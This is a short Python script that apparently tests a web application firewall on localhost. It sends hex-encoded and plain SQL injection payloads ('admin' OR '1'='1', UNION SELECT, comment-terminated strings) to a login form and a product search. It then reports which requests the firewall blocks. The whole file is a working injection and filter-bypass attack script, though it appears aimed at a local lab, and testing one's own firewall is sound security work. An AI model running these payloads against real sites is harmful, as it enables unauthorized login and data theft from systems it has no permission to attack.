#!/usr/bin/env python3
import requests
import urllib.parse

WAF_URL = "http://localhost:8080"

def test_hex_bypass():
    print("🔓 2. Testing Hex Bypass Techniques...")
    
    # Hex encoded payloads
    hex_payloads = [
        # admin' OR '1'='1
        "0x61646d696e27204f52202731273d2731",
        # ' UNION SELECT 1,2,3
        "0x2720554e494f4e2053454c45435420312c322c33",
        # ' OR 1=1--
        "0x27204f5220313d312d2d",
        # admin'--
        "0x61646d696e272d2d",
    ]
    
    print("=== Hex Payloads ===")
    for i, hex_payload in enumerate(hex_payloads, 1):
        print(f"{i}. {hex_payload}")
    
    print("\n=== Testing on Login ===")
    for hex_payload in hex_payloads:
        try:
            # Try to use hex in username
            response = requests.post(
                f"{WAF_URL}/login.php",
                data={"username": hex_payload, "password": "test"},
                timeout=5
            )
            print(f"Login Hex: {hex_payload[:20]}... | Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    
    print("\n=== Testing on Search ===")
    for hex_payload in hex_payloads:
        try:
            response = requests.get(
                f"{WAF_URL}/products.php?search={hex_payload}",
                timeout=5
            )
            print(f"Search Hex: {hex_payload[:20]}... | Status: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
    
    print("\n=== Testing Manual SQL Injection (for comparison) ===")
    manual_payloads = [
        "admin' OR '1'='1",
        "' UNION SELECT 1,2,3--",
        "' OR 1=1--",
        "admin'--",
    ]
    
    for payload in manual_payloads:
        try:
            response = requests.post(
                f"{WAF_URL}/login.php",
                data={"username": payload, "password": "test"},
                timeout=5
            )
            blocked = "🚫 BLOCKED" if response.status_code == 403 else "✅ PASSED"
            print(f"Manual: {payload[:30]}... | Status: {response.status_code} {blocked}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    test_hex_bypass()
